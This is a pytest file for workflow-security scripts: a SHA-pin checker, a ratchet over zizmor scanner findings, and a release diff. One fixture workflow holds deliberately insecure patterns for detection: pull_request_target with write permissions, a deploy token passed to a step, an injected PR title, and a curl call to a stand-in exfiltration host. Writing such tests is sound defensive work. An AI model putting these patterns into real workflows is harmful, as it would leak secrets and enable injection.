"""Tests for the workflow-security scripts: pin check, zizmor ratchet, release diff."""
from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SHA = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"


def load(name: str, filename: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / filename)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


pins = load("check_pinned_uses", "check-pinned-uses.py")
ratchet = load("workflow_security_ratchet", "workflow-security-ratchet.py")
diff = load("release_security_diff", "release-security-diff.py")


# --- check-pinned-uses -------------------------------------------------------

@pytest.mark.parametrize("ref,ok", [
    (f"actions/checkout@{SHA}", True),
    (f"Manolii-org/ai-starter-pack/.github/workflows/ci-reusable.yml@{SHA}", True),
    ("./.github/workflows/local.yml", True),
    ("Manolii-org/ai-starter-pack/.github/workflows/ci-reusable.yml@v1.22.0", False),
    ("actions/checkout@v6", False),
    ("actions/checkout@main", False),
    ("actions/checkout", False),
    (f"actions/checkout@{SHA[:12]}", False),  # short SHA is still ambiguous
    ("docker://alpine:3.20", False),
    ("docker://alpine@sha256:" + "a" * 64, True),
])
def test_classify(ref, ok):
    assert (pins.classify(ref, []) is None) is ok


def test_scan_reports_line_and_skips_comments(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text(
        "jobs:\n"
        "  a:\n"
        "    # uses: actions/checkout@v4  (commented out)\n"
        "    uses: org/repo/.github/workflows/x.yml@v1.2.3\n"
        "  b:\n"
        "    steps:\n"
        f"      - uses: actions/checkout@{SHA} # v6\n"
        "      - uses: 'actions/setup-node@v4'\n"
    )
    found = pins.scan_file(wf, [])
    assert [(line, ref) for line, ref, _ in found] == [
        (4, "org/repo/.github/workflows/x.yml@v1.2.3"),
        (8, "actions/setup-node@v4"),
    ]


def test_scan_covers_every_yaml_spelling(tmp_path):
    """Flow mappings and quoted keys are valid YAML that GitHub executes;
    a line regex missed both."""
    wf = tmp_path / "ci.yml"
    wf.write_text(
        "jobs:\n"
        "  a:\n"
        "    steps:\n"
        "      - {uses: actions/checkout@v6}\n"
        "      - \"uses\": actions/setup-python@v6\n"
        "      - uses: |-\n"
        "          actions/cache@v4\n"
        "      - uses: some/action@" + SHA + "\n"
        "        with:\n"
        "          uses: not-an-action@v1\n"  # an input value, not a reference
    )
    found = [(line, ref) for line, ref, _ in pins.scan_file(wf, [])]
    assert found == [
        (4, "actions/checkout@v6"),
        (5, "actions/setup-python@v6"),
        (6, "actions/cache@v4"),  # block scalar: reported at its `|-` line
    ]


def test_unparseable_yaml_fails_closed(tmp_path):
    wf = tmp_path / "bad.yml"
    wf.write_text("jobs: [unclosed\n")
    assert pins.scan_file(wf, [])[0][1] == "<unparseable>"


def test_allow_ref_and_exit_codes(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text("jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n")
    assert pins.main(["--root", str(tmp_path)]) == 1
    assert pins.main(["--root", str(tmp_path), "--allow-ref", r"actions/checkout@v4"]) == 0
    assert pins.main(["--root", str(tmp_path), "--allow-ref", "("]) == 2


def test_composite_actions_are_scanned(tmp_path):
    action = tmp_path / ".github" / "actions" / "x" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text("runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v4\n")
    assert action in pins.default_targets(tmp_path)
    assert pins.main(["--root", str(tmp_path)]) == 1


def test_pack_itself_is_fully_pinned():
    assert pins.main(["--root", str(ROOT)]) == 0


# --- workflow-security-ratchet ------------------------------------------------

def finding(ident="template-injection", path=".github/workflows/a.yml",
            feature="run: echo ${{ github.event.issue.title }}", row=10, ignored=False):
    return {
        "ident": ident,
        "ignored": ignored,
        "determinations": {"severity": "High"},
        "locations": [{
            "symbolic": {"key": {"Local": {"verbatim_path": path}},
                         "annotation": "may expand", "kind": "Primary"},
            "concrete": {"location": {"start_point": {"row": row}}, "feature": feature},
        }],
    }


def test_fingerprint_ignores_line_numbers_shas_and_version_comments():
    a = ratchet.fingerprint(finding(feature=f"uses: actions/checkout@{SHA} # v6", row=3))
    b = ratchet.fingerprint(finding(feature="uses:   actions/checkout@" + "1" * 40 + " # v6.0.1",
                                    row=99))
    assert a["fingerprint"] == b["fingerprint"]
    c = ratchet.fingerprint(finding(feature="uses: actions/cache@" + "1" * 40))
    assert c["fingerprint"] != a["fingerprint"]


def test_ratchet_new_gone_and_duplicates(tmp_path):
    baseline = tmp_path / "baseline.json"
    known = [finding(), finding()]  # same finding twice in one file
    zz = tmp_path / "zz.json"
    zz.write_text(json.dumps(known))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline), "--write-baseline"]) == 0
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 0

    # A third copy of an already-baselined finding is still new.
    zz.write_text(json.dumps(known + [finding()]))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 1

    # A fixed finding fails until the baseline is shrunk (burn-down only).
    zz.write_text(json.dumps(known[:1]))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 1

    # Ignored (zizmor: ignore) findings never count.
    zz.write_text(json.dumps(known + [finding(ident="artipacked", ignored=True)]))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 0


def test_scanner_errors_exit_2_not_drift_1(tmp_path):
    """Callers must tell 'scanner broken' (2) from 'baseline drift' (1)."""
    with pytest.raises(SystemExit) as missing:
        ratchet.run_zizmor(str(tmp_path / "no-such-zizmor"), ["."])
    assert missing.value.code == 2

    fake = tmp_path / "fake-zizmor"
    fake.write_text("#!/bin/sh\necho 'not json'\nexit 3\n")
    fake.chmod(0o755)
    with pytest.raises(SystemExit) as garbage:
        ratchet.run_zizmor(str(fake), ["."])
    assert garbage.value.code == 2


def test_committed_baseline_is_well_formed():
    data = json.loads((ROOT / "config" / "zizmor-baseline.json").read_text())
    assert data["findings"], "baseline should list the known findings"
    for e in data["findings"]:
        assert set(e) == {"fingerprint", "ident", "path", "severity"}
        assert len(e["fingerprint"]) == 16


# --- release-security-diff ----------------------------------------------------

def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def test_release_diff_reports_security_facts(tmp_path):
    repo = tmp_path / "r"
    wf = repo / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    git(tmp_path, "init", "-q", "r")
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    wf.write_text(
        "on: pull_request\n"
        "permissions:\n  contents: read\n"
        "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
        f"      - uses: actions/checkout@{SHA}\n"
        "      - run: python3 -c 'secrets.append(1)'\n"
    )
    (repo / "README.md").write_text("x\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    wf.write_text(
        "on:\n  pull_request_target:\n"
        "permissions:\n  contents: write\n"
        "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
        f"      - uses: actions/checkout@{SHA}\n"
        "      - uses: evil/action@" + "2" * 40 + "\n"
        "      - env:\n          T: ${{ secrets.DEPLOY_TOKEN }}\n"
        "        run: |\n"
        "          echo \"${{ github.event.pull_request.title }}\"\n"
        "          curl -s https://exfil.example.net/x\n"
    )
    git(repo, "commit", "-qam", "head")

    text = diff.report(repo, "HEAD~1", "HEAD")
    assert "`pull_request_target`" in text
    assert "`workflow: contents=write`" in text
    assert "➕ `DEPLOY_TOKEN`" in text
    assert "append" not in text  # secrets.append(...) in a script is not a secret
    assert "evil/action@" in text
    assert "github.event.pull_request.title" in text
    assert "exfil.example.net" in text


def test_release_diff_no_workflow_changes(tmp_path):
    repo = tmp_path / "r"
    repo.mkdir()
    git(tmp_path, "init", "-q", "r")
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    (repo / "a.txt").write_text("1")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "1")
    (repo / "a.txt").write_text("2")
    git(repo, "commit", "-qam", "2")
    assert "No workflow or action files changed." in diff.report(repo, "HEAD~1", "HEAD")
